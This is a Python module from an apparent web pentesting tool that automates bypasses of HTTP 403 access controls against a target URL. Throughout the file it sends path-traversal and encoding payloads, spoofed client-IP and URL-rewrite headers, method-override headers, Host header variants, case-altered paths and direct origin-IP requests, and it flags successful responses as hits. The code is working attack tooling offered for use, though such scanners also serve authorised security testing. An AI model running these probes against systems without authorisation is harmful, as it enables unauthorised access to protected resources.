"""Main bypass probes split out from core orchestrator."""

from __future__ import annotations

import json
import socket
from concurrent.futures import ThreadPoolExecutor
from json import JSONDecodeError
from random import choice
from urllib.parse import urldefrag, urlparse

import requests
from requests.exceptions import RequestException, SSLError

from nomoreforbidden.context import RunContext
from nomoreforbidden.request_utils import (
    DEFAULT_TIMEOUT,
    fp_signals,
    req_kwargs,
    response_metadata,
    session_get,
    session_post,
    session_request,
)

# Varsayılan URL sonekleri: encoding, çift encoding, path normalizasyonu, JVM (;)
_DEFAULT_URL_PAYLOADS: tuple[str, ...] = (
    "/",
    "/*",
    "/%2f/",
    "/./",
    "/./.",
    "/*/",
    "?",
    "??",
    "&",
    "#",
    "%",
    "%20",
    "%09",
    "/..;/",
    "/../",
    "/..%2f",
    "/..;/",
    "/.././",
    "/..%00/",
    "/..%0d",
    "/..%5c",
    "/..%ff/",
    "/%2e%2e%2f/",
    "/.%2e/",
    "/%3f",
    "%26",
    "%23",
    ".json",
    "/%252e/",
    "/%252e%252e/",
    "/..%252f",
    "/%2e/",
    "/;",
    "/;x=",
    "/%00/",
    "/%0a/",
    "/%0d%0a/",
)

_DEFAULT_IP_HEADERS: tuple[str, ...] = (
    "X-Forwarded-Host",
    "X-Custom-IP-Authorization",
    "X-Forwarded-For",
    "Client-IP",
    "True-Client-IP",
    "X-Real-IP",
    "CF-Connecting-IP",
    "X-Cluster-Client-IP",
    "Fastly-Client-IP",
    "X-Forwarded-Scheme",
    "X-Forwarded-Prefix",
)

_CACHE_HEADERS: tuple[str, ...] = ("X-Original-URL", "X-Rewrite-URL")
_REWRITE_HEADERS: tuple[str, ...] = ("X-Forwarded-URL", "X-Proxy-URL", "X-Forwarded-Path")
_METHOD_OVERRIDE_PAIRS: tuple[tuple[str, str], ...] = (
    ("X-HTTP-Method-Override", "HEAD"),
    ("X-HTTP-Method-Override", "PATCH"),
    ("X-HTTP-Method-Override", "DELETE"),
    ("X-HTTP-Method", "OPTIONS"),
    ("X-HTTP-Method", "GET"),
    ("X-Method-Override", "PUT"),
)


def collect_url_payloads(ctx: RunContext) -> list[str]:
    payloads = list(_DEFAULT_URL_PAYLOADS)
    for payload in ctx.extra_payloads:
        if payload not in payloads:
            payloads.append(payload)
    return payloads


def build_merged_ip_headers(ctx: RunContext) -> list[str]:
    names = list(_DEFAULT_IP_HEADERS)
    for header in ctx.extra_ip_headers:
        if header not in names:
            names.append(header)
    return names


def build_cache_header_targets(base: str, url: str) -> list[tuple[str, str]]:
    targets: list[tuple[str, str]] = [(base, "root")]
    if url != base:
        targets.append((url, "same_path"))
    return targets


def build_content_header_combos(parsed, path: str, ip: str) -> list[dict[str, str]]:
    netloc = parsed.netloc
    return [
        {"Accept": "application/json"},
        {"Accept": "*/*"},
        {"Content-Type": "application/json"},
        {"Content-Type": "application/x-www-form-urlencoded"},
        {"Accept": "application/json", "X-Original-URL": path},
        {"X-Forwarded-For": ip, "X-Original-URL": path},
        {"X-Forwarded-Host": netloc, "X-Rewrite-URL": path},
        {
            "User-Agent": (
                "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
            )
        },
        {"X-Forwarded-Proto": "https", "X-Forwarded-For": ip},
        {"X-Forwarded-For": ip, "X-Forwarded-Proto": parsed.scheme},
        {"X-Originating-IP": ip},
        {"X-Remote-IP": ip},
        {"X-Client-IP": ip},
    ]


def nmf(url: str, ctx: RunContext) -> None:
    parsed = urlparse(url)
    path = parsed.path
    base = f"{parsed.scheme}://{parsed.netloc}"
    ip = ctx.ip
    verbose = ctx.verbose
    baseline_response = _resolve_fp_baseline(ctx, url, base)

    payloads = collect_url_payloads(ctx)

    path_variants = _build_path_variants(base, path)

    def run_payload(payload: str) -> None:
        bypassreq = url + payload
        try:
            urlbypass = session_get(ctx, bypassreq, allow_redirects=False)
            maybe_fp, signals = fp_signals(ctx, baseline_response, urlbypass)
            _emit_url_bypass_result(
                ctx,
                verbose,
                bypassreq,
                urlbypass.status_code,
                maybe_fp,
                signals,
                response_metadata(urlbypass),
            )
        except RequestException as e:
            if verbose:
                print(f"Error with payload {payload}: {e}")
                if ctx.structured:
                    ctx.record(
                        category="error",
                        phase="url_payload",
                        payload=payload,
                        error=str(e),
                    )

    if ctx.concurrency > 1:
        with ThreadPoolExecutor(max_workers=ctx.concurrency) as executor:
            list(executor.map(run_payload, payloads))
    else:
        for payload in payloads:
            run_payload(payload)

    for variant_url in path_variants:
        try:
            response = session_get(ctx, variant_url, allow_redirects=False)
            maybe_fp, signals = fp_signals(ctx, baseline_response, response)
            if ctx.structured:
                if verbose or response.status_code in (200, 302):
                    ctx.record(
                        category="path_variant",
                        request_url=variant_url,
                        status_code=response.status_code,
                        possible_false_positive=maybe_fp,
                        **response_metadata(response),
                        **signals,
                    )
            elif verbose:
                print(f"{variant_url} [{response.status_code}]")
            elif response.status_code in (200, 302):
                if maybe_fp:
                    print(
                        f"{variant_url} [{response.status_code}] Possible False Positive"
                    )
                else:
                    print(f"{variant_url} [{response.status_code}]")
            if response.status_code in (200, 302):
                ctx.register_hit()
        except RequestException as e:
            if verbose:
                print(f"Error with path variant {variant_url}: {e}")
                if ctx.structured:
                    ctx.record(
                        category="error",
                        phase="path_variant",
                        request_url=variant_url,
                        error=str(e),
                    )

    ip_headers = build_merged_ip_headers(ctx)

    for header in ip_headers:
        try:
            spoof_value = path if header == "X-Forwarded-Prefix" else ip
            if header == "X-Forwarded-Scheme":
                spoof_value = parsed.scheme
            response = session_get(
                ctx, url, allow_redirects=False, headers={header: spoof_value}
            )
            if ctx.structured:
                if verbose or response.status_code in (200, 302):
                    ctx.record(
                        category="ip_header",
                        header=header,
                        status_code=response.status_code,
                        spoof_value=spoof_value,
                        **response_metadata(response),
                    )
            elif verbose:
                print(f"{header} [{response.status_code}]")
            elif response.status_code in (200, 302):
                print(f"{header} [{response.status_code}] Value={spoof_value}")
            if response.status_code in (200, 302):
                ctx.register_hit()
        except RequestException as e:
            if verbose:
                print(f"Error with header {header}: {e}")
                if ctx.structured:
                    ctx.record(
                        category="error",
                        phase="ip_header",
                        header=header,
                        error=str(e),
                    )

    try:
        fwd = f'for={ip};proto={parsed.scheme};host="{parsed.netloc}"'
        response = session_get(
            ctx, url, allow_redirects=False, headers={"Forwarded": fwd}
        )
        if ctx.structured:
            if verbose or response.status_code in (200, 302):
                ctx.record(
                    category="ip_header",
                    header="Forwarded",
                    status_code=response.status_code,
                    spoof_value=fwd,
                    **response_metadata(response),
                )
        elif verbose:
            print(f"Forwarded [{response.status_code}]")
        elif response.status_code in (200, 302):
            print(f"Forwarded [{response.status_code}] Value={fwd}")
        if response.status_code in (200, 302):
            ctx.register_hit()
    except RequestException as e:
        if verbose:
            print(f"Error with Forwarded header: {e}")
            if ctx.structured:
                ctx.record(
                    category="error",
                    phase="ip_header",
                    header="Forwarded",
                    error=str(e),
                )

    # CDN-style: request site root with rewrite headers. Some apps only honor
    # X-Original-URL / X-Rewrite-URL on the protected route — also probe the target URL.
    cache_header_targets = build_cache_header_targets(base, url)

    full_url = urldefrag(url)[0]
    cache_header_values: tuple[tuple[str, str], ...] = (
        ("path", path),
        ("full_url", full_url),
    )

    for header in _CACHE_HEADERS:
        for target_url, cache_strategy in cache_header_targets:
            for value_kind, header_value in cache_header_values:
                try:
                    response = session_get(
                        ctx,
                        target_url,
                        allow_redirects=True,
                        headers={header: header_value},
                    )
                    maybe_fp, signals = fp_signals(ctx, baseline_response, response)
                    meta = {
                        **response_metadata(response),
                        "cache_header_target": cache_strategy,
                        "cache_header_value_kind": value_kind,
                        "request_url": target_url,
                    }
                    _emit_header_bypass_result(
                        ctx,
                        header,
                        response.status_code,
                        maybe_fp,
                        signals,
                        meta,
                    )
                except RequestException as e:
                    if verbose:
                        print(
                            f"Error with header {header} ({cache_strategy}, {value_kind}): {e}"
                        )
                        if ctx.structured:
                            ctx.record(
                                category="error",
                                phase="cache_header",
                                header=header,
                                cache_header_target=cache_strategy,
                                cache_header_value_kind=value_kind,
                                request_url=target_url,
                                error=str(e),
                            )

    for header in _REWRITE_HEADERS:
        for target_url, cache_strategy in cache_header_targets:
            for value_kind, header_value in cache_header_values:
                try:
                    response = session_get(
                        ctx,
                        target_url,
                        allow_redirects=True,
                        headers={header: header_value},
                    )
                    maybe_fp, signals = fp_signals(ctx, baseline_response, response)
                    if ctx.structured:
                        if verbose or response.status_code in (200, 302):
                            ctx.record(
                                category="rewrite_header",
                                header=header,
                                cache_header_target=cache_strategy,
                                cache_header_value_kind=value_kind,
                                request_url=target_url,
                                status_code=response.status_code,
                                possible_false_positive=maybe_fp,
                                **response_metadata(response),
                                **signals,
                            )
                    elif verbose:
                        print(
                            f"{header} {value_kind} [{response.status_code}] "
                            f"target={cache_strategy}"
                        )
                    elif response.status_code in (200, 302):
                        if maybe_fp:
                            print(
                                f"{header} {value_kind} [{response.status_code}] "
                                "Possible False Positive"
                            )
                        else:
                            print(
                                f"{header} {value_kind} [{response.status_code}]"
                            )
                    if response.status_code in (200, 302):
                        ctx.register_hit()
                except RequestException as e:
                    if verbose:
                        print(f"Error with rewrite header {header}: {e}")
                        if ctx.structured:
                            ctx.record(
                                category="error",
                                phase="rewrite_header",
                                header=header,
                                error=str(e),
                            )

    for header, method in _METHOD_OVERRIDE_PAIRS:
        try:
            response = session_get(
                ctx,
                url,
                allow_redirects=False,
                headers={header: method},
            )
            if ctx.structured:
                if verbose or response.status_code in (200, 302):
                    ctx.record(
                        category="method_override",
                        header=header,
                        override_method=method,
                        status_code=response.status_code,
                        **response_metadata(response),
                    )
            elif verbose:
                print(f"{header}:{method} [{response.status_code}]")
            elif response.status_code in (200, 302):
                print(f"{header}:{method} [{response.status_code}]")
            if response.status_code in (200, 302):
                ctx.register_hit()
        except RequestException as e:
            if verbose:
                print(f"Error with method override {header}: {e}")
                if ctx.structured:
                    ctx.record(
                        category="error",
                        phase="method_override",
                        header=header,
                        override_method=method,
                        error=str(e),
                    )

    host_variations = [
        {"Host": parsed.netloc},
        {"X-Host": parsed.netloc},
        {"X-Forwarded-Host": parsed.netloc},
        {"X-Forwarded-Server": parsed.netloc},
        {"X-Original-Host": parsed.netloc},
    ]
    for headers in host_variations:
        try:
            response = session_get(ctx, url, allow_redirects=False, headers=headers)
            header_name = next(iter(headers))
            header_value = headers[header_name]
            if ctx.structured:
                if verbose or response.status_code in (200, 302):
                    ctx.record(
                        category="host_header",
                        header=header_name,
                        header_value=header_value,
                        status_code=response.status_code,
                        **response_metadata(response),
                    )
            elif verbose:
                print(f"{header_name}:{header_value} [{response.status_code}]")
            elif response.status_code in (200, 302):
                print(f"{header_name}:{header_value} [{response.status_code}]")
            if response.status_code in (200, 302):
                ctx.register_hit()
        except RequestException as e:
            if verbose:
                print(f"Error with host header {headers}: {e}")
                if ctx.structured:
                    ctx.record(
                        category="error",
                        phase="host_header",
                        header=next(iter(headers)),
                        error=str(e),
                    )

    content_variations = build_content_header_combos(parsed, path, ip)
    for headers in content_variations:
        try:
            response = session_get(ctx, url, allow_redirects=False, headers=headers)
            maybe_fp, signals = fp_signals(ctx, baseline_response, response)
            if ctx.structured:
                if verbose or response.status_code in (200, 302):
                    ctx.record(
                        category="header_combo",
                        headers=headers,
                        status_code=response.status_code,
                        possible_false_positive=maybe_fp,
                        **response_metadata(response),
                        **signals,
                    )
            elif verbose:
                print(f"{headers} [{response.status_code}]")
            elif response.status_code in (200, 302):
                if maybe_fp:
                    print(
                        f"{headers} [{response.status_code}] Possible False Positive"
                    )
                else:
                    print(f"{headers} [{response.status_code}]")
            if response.status_code in (200, 302):
                ctx.register_hit()
        except RequestException as e:
            if verbose:
                print(f"Error with header combo {headers}: {e}")
                if ctx.structured:
                    ctx.record(
                        category="error",
                        phase="header_combo",
                        headers=headers,
                        error=str(e),
                    )

    try:
        req = "".join(choice((str.upper, str.lower))(char) for char in path)
        newurl = base + req
        response = session_get(ctx, newurl)
        if ctx.structured:
            if verbose or response.status_code in (200, 302):
                ctx.record(
                    category="case_path",
                    method="GET",
                    request_url=newurl,
                    status_code=response.status_code,
                    **response_metadata(response),
                )
        elif verbose:
            print(f"Uppercase Result [{response.status_code}] Changed URL [{newurl}]")
        elif response.status_code in (200, 302):
            print(f"Uppercase Result [{response.status_code}] Changed URL [{newurl}]")
        if response.status_code in (200, 302):
            ctx.register_hit()

        response = session_post(ctx, newurl)
        if ctx.structured:
            if verbose or response.status_code in (200, 302):
                ctx.record(
                    category="case_path",
                    method="POST",
                    request_url=newurl,
                    status_code=response.status_code,
                    **response_metadata(response),
                )
        elif verbose:
            print(f"Post Request Result [{response.status_code}]")
        elif response.status_code in (200, 302):
            print(f"Post Request Result [{response.status_code}]")
        if response.status_code in (200, 302):
            ctx.register_hit()

        for method in ctx.extra_methods:
            response = session_request(ctx, method, newurl)
            if ctx.structured:
                if verbose or response.status_code in (200, 302):
                    ctx.record(
                        category="case_path",
                        method=method,
                        request_url=newurl,
                        status_code=response.status_code,
                        **response_metadata(response),
                    )
            elif verbose:
                print(f"{method} Request Result [{response.status_code}]")
            elif response.status_code in (200, 302):
                print(f"{method} Request Result [{response.status_code}]")
            if response.status_code in (200, 302):
                ctx.register_hit()
    except RequestException as e:
        if verbose:
            print(f"Error with changed URL: {e}")
            if ctx.structured:
                ctx.record(category="error", phase="case_path", error=str(e))


def _resolve_fp_baseline(ctx: RunContext, target_url: str, base_url: str):
    if ctx.fp_baseline == "target":
        return session_get(ctx, target_url, allow_redirects=False)
    if ctx.fp_baseline == "root":
        return session_get(ctx, base_url, allow_redirects=False)

    try:
        target_response = session_get(ctx, target_url, allow_redirects=False)
        if target_response.status_code >= 400:
            return target_response
    except RequestException:
        pass
    return session_get(ctx, base_url, allow_redirects=False)


def wayback(url: str, ctx: RunContext) -> None:
    api_url = "https://archive.org/wayback/available?url=" + url
    verbose = ctx.verbose
    try:
        waybackreq = ctx.session.get(
            api_url, **req_kwargs(ctx, {"timeout": DEFAULT_TIMEOUT, "verify": True})
        )
        ctx.after_request()
        waybackreq.raise_for_status()
    except RequestException as e:
        if ctx.structured:
            ctx.record(category="wayback", error=str(e))
        elif verbose:
            print(f"Error accessing Wayback Machine: {e}")
        return

    try:
        data = json.loads(waybackreq.content)
    except JSONDecodeError:
        if ctx.structured:
            ctx.record(category="wayback", error="invalid_json")
        elif verbose:
            print("Wayback response was not valid JSON")
        return

    snap = data.get("archived_snapshots", {}).get("closest", {}).get("url")
    if snap:
        if ctx.structured:
            ctx.record(category="wayback", snapshot_url=snap)
        else:
            print("Wayback History Found [" + snap + "]")
        ctx.register_hit()
    else:
        if ctx.structured:
            ctx.record(category="wayback", found=False)
        elif verbose:
            print("Wayback history not found")


def ssl_switch(url: str, ctx: RunContext) -> None:
    verbose = ctx.verbose
    protocol = urlparse(url).scheme
    if protocol == "http":
        switched = url.replace("http", "https", 1)
    else:
        switched = url.replace("https", "http", 1)
    try:
        response = session_get(ctx, switched)
        scheme = urlparse(switched).scheme.upper()
        if ctx.structured:
            ctx.record(
                category="protocol_switch",
                request_url=switched,
                status_code=response.status_code,
                scheme=scheme,
                **response_metadata(response),
            )
        elif verbose:
            print(
                f"Protocol Change Result [{response.status_code}] Changed Protocol [{scheme}]"
            )
        elif response.status_code in (200, 302):
            print(
                f"Protocol Change Result [{response.status_code}] Changed Protocol [{scheme}]"
            )
        if response.status_code in (200, 302):
            ctx.register_hit()
    except requests.exceptions.SSLError as e:
        if verbose:
            print(f"SSL error occurred: {e}")
        if ctx.structured:
            ctx.record(category="protocol_switch", error=str(e), error_type="ssl")
    except requests.exceptions.RequestException as e:
        if verbose:
            print(f"An error occurred: {e}")
        if ctx.structured:
            ctx.record(category="protocol_switch", error=str(e))


def get_ip(url: str, ctx: RunContext) -> None:
    verbose = ctx.verbose
    domain = urlparse(url).netloc
    try:
        ip_address = socket.gethostbyname(domain)
        if ctx.structured:
            ctx.record(category="dns", domain=domain, resolved_ip=ip_address)
        elif verbose:
            print(f"Original Domain: {domain}")
            print(f"IP Address: {ip_address}")

        ip_url = f"{urlparse(url).scheme}://{ip_address}{urlparse(url).path}"
        try:
            response = session_get(ctx, ip_url, headers={"Host": domain})
            if "Server" in response.headers:
                server = response.headers["Server"].lower()
                if "cloudflare" in server or "cloudfront" in server:
                    if ctx.structured:
                        ctx.record(
                            category="direct_ip",
                            request_url=ip_url,
                            cdn_detected=True,
                            server_header=server,
                        )
                    else:
                        print(f"CDN detected ({server}) - Not Origin IP")
                else:
                    _print_response(ctx, ip_url, response.status_code)
            else:
                _print_response(ctx, ip_url, response.status_code)
        except SSLError:
            if ctx.structured:
                ctx.record(
                    category="direct_ip",
                    request_url=ip_url,
                    error="ssl_handshake_failed",
                )
            else:
                print("CDN/WAF detected - SSL handshake failed")
        except RequestException as e:
            if "SSLError" in type(e).__name__ or "SSL" in str(e):
                if ctx.structured:
                    ctx.record(
                        category="direct_ip",
                        request_url=ip_url,
                        error="ssl_handshake_failed",
                    )
                else:
                    print("CDN/WAF detected - SSL handshake failed")
            elif verbose:
                print(f"Request Error: {e}")
                if ctx.structured:
                    ctx.record(category="direct_ip", request_url=ip_url, error=str(e))
    except OSError as e:
        if ctx.structured:
            ctx.record(category="dns", domain=domain, error=str(e))
        elif verbose:
            print(f"Could not resolve IP for domain: {domain} ({e})")


def _emit_url_bypass_result(
    ctx: RunContext,
    verbose: bool,
    bypassreq: str,
    status: int,
    maybe_fp: bool,
    fp_details: dict[str, object],
    metadata: dict[str, object],
) -> None:
    if ctx.structured:
        if status not in (200, 302):
            if verbose:
                ctx.record(
                    category="url_payload",
                    request_url=bypassreq,
                    status_code=status,
                    possible_false_positive=False,
                )
            return
        ctx.record(
            category="url_payload",
            request_url=bypassreq,
            status_code=status,
            possible_false_positive=maybe_fp,
            **metadata,
            **fp_details,
        )
        ctx.register_hit()
        return

    if status not in (200, 302):
        if verbose:
            print(f"{bypassreq} [{status}]")
        return
    ctx.register_hit()
    if maybe_fp:
        print(f"{bypassreq} [{status}] Possible False Positive")
    else:
        print(f"{bypassreq} [{status}]")


def _build_path_variants(base: str, path: str) -> list[str]:
    current_path = path or "/"
    stripped = current_path.rstrip("/")
    variants = [
        f"{base}//{current_path.lstrip('/')}",
        f"{base}{current_path}/",
        f"{base}{current_path}/.",
        f"{base}{current_path}/..;/",
        f"{base}{current_path};/",
        f"{base}{current_path}.",
        f"{base}/{current_path.lstrip('/')}..;/",
        f"{base}/{current_path.lstrip('/')}/%2e/",
        f"{base}{stripped}/%2e%2e/",
        f"{base}{stripped}/..%2f",
        f"{base}{stripped}%20",
        f"{base}{stripped}/",
        f"{base}{stripped}//",
        f"{base}{stripped}/..",
    ]

    deduped: list[str] = []
    for item in variants:
        if item not in deduped:
            deduped.append(item)
    return deduped


def _emit_header_bypass_result(
    ctx: RunContext,
    header: str,
    status: int,
    maybe_fp: bool,
    fp_details: dict[str, object],
    metadata: dict[str, object],
) -> None:
    if ctx.structured:
        if status not in (200, 302):
            return
        ctx.record(
            category="cache_header",
            header=header,
            status_code=status,
            possible_false_positive=maybe_fp,
            **metadata,
            **fp_details,
        )
        ctx.register_hit()
        return

    if status not in (200, 302):
        return
    ctx.register_hit()
    if maybe_fp:
        print(f"{header} [{status}] Possible False Positive")
    else:
        print(f"{header} [{status}]")


def _print_response(ctx: RunContext, url: str, status_code: int) -> None:
    verbose = ctx.verbose
    if ctx.structured:
        ctx.record(
            category="direct_ip",
            request_url=url,
            status_code=status_code,
        )
        if status_code in (200, 302):
            ctx.register_hit()
        return
    if verbose:
        print(f"IP URL: {url}")
        print(f"Status Code: {status_code}")
    elif status_code in (200, 302):
        print(f"IP URL: {url} [{status_code}]")
    if status_code in (200, 302):
        ctx.register_hit()
